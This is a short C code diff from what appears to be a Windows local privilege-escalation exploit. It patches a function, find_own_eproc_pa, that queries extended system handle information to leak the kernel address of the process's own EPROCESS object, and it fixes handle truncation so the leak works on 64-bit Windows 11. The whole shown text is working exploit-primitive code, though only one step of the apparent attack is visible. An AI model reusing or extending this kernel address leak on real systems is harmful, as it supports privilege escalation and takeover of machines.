@@ -357,25 +357,33 @@ static uint64_t find_own_eproc_pa(void)
         HANDLE hself = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE,
                                    GetCurrentProcessId());
         if (hself) {
+            /* Use class 0x40 (SystemExtendedHandleInformation) — ULONG_PTR fields
+         * avoid USHORT Handle truncation for handles > 65535 on Win11 64-bit */
             typedef struct {
-                ULONG ProcessId; UCHAR ObjType, Flags;
-                USHORT Handle; PVOID Object; ACCESS_MASK Access;
+                ULONG_PTR Object;
+                ULONG_PTR UniqueProcessId;
+                ULONG_PTR HandleValue;
+                ACCESS_MASK GrantedAccess;
+                USHORT CreatorBackTraceIndex;
+                USHORT ObjectTypeIndex;
+                ULONG HandleAttributes;
+                ULONG Reserved;
             } SHE;
-            typedef struct { ULONG Count; SHE H[1]; } SHI;
+            typedef struct { ULONG_PTR Count; ULONG_PTR Reserved2; SHE H[1]; } SHI;
 
             ULONG sz = 0x40000; SHI *info = NULL; NTSTATUS st;
             do {
                 free(info); info = (SHI*)malloc(sz *= 2);
                 if (!info) break;
-                st = fn(0x10, info, sz, NULL);
+                st = fn(0x40, info, sz, NULL);
             } while (st == (NTSTATUS)0xC0000004L);
 
             uint64_t kva = 0;
             if (info && st == 0) {
-                DWORD pid = GetCurrentProcessId();
-                USHORT h = (USHORT)(uintptr_t)hself;
-                for (ULONG i = 0; i < info->Count; i++)
-                    if (info->H[i].ProcessId == pid && info->H[i].Handle == h)
+                ULONG_PTR pid = (ULONG_PTR)GetCurrentProcessId();
+                ULONG_PTR h   = (ULONG_PTR)(uintptr_t)hself;
+                for (ULONG_PTR i = 0; i < info->Count; i++)
+                    if (info->H[i].UniqueProcessId == pid && info->H[i].HandleValue == h)
                         { kva = (uint64_t)info->H[i].Object; break; }
             }
             free(info);
